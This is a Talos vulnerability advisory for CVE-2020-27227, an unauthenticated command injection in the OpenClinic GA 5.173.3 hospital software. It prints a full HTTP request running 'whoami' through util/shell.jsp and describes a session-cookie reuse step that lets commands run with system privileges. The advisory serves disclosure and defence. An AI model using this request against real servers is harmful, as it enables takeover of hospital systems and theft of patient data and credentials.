# Talos Vulnerability Report

### TALOS-2020-1203

## OpenClinic GA unauthenticated command injection vulnerability

##### April 13, 2021

##### CVE Number

CVE-2020-27227

### Summary

An exploitable unatuhenticated command injection exists in the OpenClinic GA 5.173.3. Specially crafted web requests can cause commands to be executed on the server. An attacker can send a web request with parameters containing specific parameter to trigger this vulnerability, potentially allowing exfiltration of the database, user credentials and compromise underlying operating system.

### Tested Versions

OpenClinic GA 5.173.3

### Product URLs

<https://sourceforge.net/projects/open-clinic/>

### CVSSv3 Score

10.0 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-77 - Improper Neutralization of Special Elements used in a Command (‘Command Injection’)

### Details

OpenClinic GA is an open source fully integrated hospital management solution.

A command injections have been found in OpenClinic GA. A successful attack could allow an attacker to compromise the server. The hollowing request could be used to trigger this vulnerability however the procedure described below needs to be followed.

```
POST /openclinic/util/shell.jsp HTTP/1.1
Host: [IP]:10080
Content-Length: 8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[IP]:10080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-
exchange;v=b3;q=0.9
Referer: http://[IP]:10080/openclinic/util/shell.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Cookie: JSESSIONID=AAAAAAAAAAAAAAAAAAAAAAAAAAAA

c=whoami

```

Note that in order to exploit this vulnerablity, an attacker needs to issue request twice. First, with a random `JSESSIONID` cookie, to which the server will reply with new `JSESSIONID` and redirection to ‘relogin’. The attacker simply needs to take this new `JSESSIONID` cookie value and use it in follow up exploit attempt, at which point the server will accept the request as valid and will execute the request with `NT System` privileges
